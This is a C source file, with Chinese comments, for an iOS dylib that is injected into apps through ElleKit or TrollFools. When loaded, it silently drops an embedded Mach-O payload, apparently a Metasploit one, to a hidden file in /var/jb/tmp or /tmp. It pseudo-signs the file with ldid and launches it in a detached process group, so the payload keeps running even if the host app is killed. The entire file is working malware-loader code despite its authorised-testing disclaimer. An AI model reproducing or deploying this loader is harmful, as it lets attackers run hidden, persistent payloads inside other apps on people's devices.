/*
 * wrapper.c - 把内嵌的 Mach-O 载荷释放到磁盘并后台执行
 *
 * 工作流程（dylib 被 ElleKit / TrollFools 加载时触发）：
 *   1. __constructor 构造函数创建一个后台线程，不阻塞宿主进程启动；
 *   2. 依次尝试 /var/jb/tmp（rootless 越狱）、/tmp（沙盒/巨魔兜底）；
 *   3. 若已有旧实例（pid 文件），先 kill 防止重复驻留；
 *   4. 把内嵌的 Mach-O 写出，chmod 0755；
 *   5. 若存在 ldid，先对释放出的二进制做伪签名；
 *   6. posix_spawn 后台执行，子进程放入独立进程组；
 *   7. 记录 pid 文件，便于下次升级/清理。
 *
 * 仅可用于本人所有、已授权的测试设备。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/wait.h>

extern char **environ;

#include "payload_blob.h"

/* 平台兼容：Apple 叫 POSIX_SPAWN_SETGROUP，glibc 叫 POSIX_SPAWN_SETPGROUP */
#ifndef POSIX_SPAWN_SETGROUP
  #ifdef POSIX_SPAWN_SETPGROUP
    #define POSIX_SPAWN_SETGROUP POSIX_SPAWN_SETPGROUP
  #else
    #define POSIX_SPAWN_SETGROUP 0
  #endif
#endif

#define PAYLOAD_NAME ".msf_payload"
#define PID_NAME     ".msf_payload.pid"

/* 释放目录，按优先级排列 */
static const char *kCandidateDirs[] = {
    "/var/jb/tmp",   /* Dopamine rootless 越狱 */
    "/tmp",          /* 沙盒 App / 其他环境兜底 */
    NULL,
};

/* ldid 常见路径（rootless 下由越狱环境提供） */
static const char *kLdidPaths[] = {
    "/var/jb/usr/bin/ldid",
    "/usr/bin/ldid",
    NULL,
};

/* posix_spawn 一个程序并等待其退出，返回退出码，失败返回 -1 */
static int spawn_sync(const char *path, char *const argv[])
{
    pid_t pid = -1;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETGROUP);
    posix_spawnattr_setpgroup(&attr, 0);

    int rc = posix_spawn(&pid, path, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    if (rc != 0) {
        return -1;
    }

    int status = 0;
    if (waitpid(pid, &status, 0) < 0) {
        return -1;
    }
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* 杀掉旧实例，避免 respring/重复注入后驻留多个载荷 */
static void kill_previous(const char *pid_path)
{
    FILE *f = fopen(pid_path, "r");
    if (!f) {
        return;
    }
    int old_pid = 0;
    if (fscanf(f, "%d", &old_pid) == 1 && old_pid > 1) {
        kill(old_pid, SIGKILL);
    }
    fclose(f);
    unlink(pid_path);
}

/* 完整写出内嵌载荷，返回 0 成功 */
static int dump_payload(const char *bin_path)
{
    int fd = open(bin_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) {
        return -1;
    }

    size_t off = 0;
    while (off < payload_len) {
        ssize_t n = write(fd, payload_data + off, payload_len - off);
        if (n <= 0) {
            if (errno == EINTR) {
                continue;
            }
            close(fd);
            return -1;
        }
        off += (size_t)n;
    }
    close(fd);

    if (chmod(bin_path, 0755) != 0) {
        return -1;
    }
    return 0;
}

/* 若环境中存在 ldid，对释放出的二进制做伪签名，提高执行成功率 */
static void try_sign(const char *bin_path)
{
    for (int i = 0; kLdidPaths[i] != NULL; i++) {
        if (access(kLdidPaths[i], X_OK) != 0) {
            continue;
        }
        char *argv[] = { (char *)kLdidPaths[i], (char *)"-S",
                         (char *)bin_path, NULL };
        spawn_sync(kLdidPaths[i], argv);
        return;
    }
}

/* 在指定目录下完成释放 + 签名 + 执行，返回 0 成功 */
static int deploy_in_dir(const char *dir)
{
    char bin_path[512];
    char pid_path[512];

    snprintf(bin_path, sizeof(bin_path), "%s/%s", dir, PAYLOAD_NAME);
    snprintf(pid_path, sizeof(pid_path), "%s/%s", dir, PID_NAME);

    kill_previous(pid_path);

    if (dump_payload(bin_path) != 0) {
        return -1;
    }

    try_sign(bin_path);

    /* 后台执行：独立进程组，降低随宿主进程被一起挂起/杀掉的概率 */
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETGROUP);
    posix_spawnattr_setpgroup(&attr, 0);

    pid_t pid = -1;
    char *argv[] = { bin_path, NULL };
    int rc = posix_spawn(&pid, bin_path, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    if (rc != 0) {
        return -1;
    }

    FILE *f = fopen(pid_path, "w");
    if (f) {
        fprintf(f, "%d\n", (int)pid);
        fclose(f);
    }
    return 0;
}

static void *worker(void *arg)
{
    (void)arg;

    /* 等宿主进程完成启动，避免在 dyld 加载阶段抢资源 */
    sleep(2);

    for (int i = 0; kCandidateDirs[i] != NULL; i++) {
        const char *dir = kCandidateDirs[i];
        if (access(dir, W_OK) != 0) {
            continue;
        }
        if (deploy_in_dir(dir) == 0) {
            return NULL;
        }
    }
    return NULL;
}

/* dylib 加载入口 */
__attribute__((constructor))
static void initializer(void)
{
    pthread_t thread;
    if (pthread_create(&thread, NULL, worker, NULL) == 0) {
        pthread_detach(thread);
    }
}
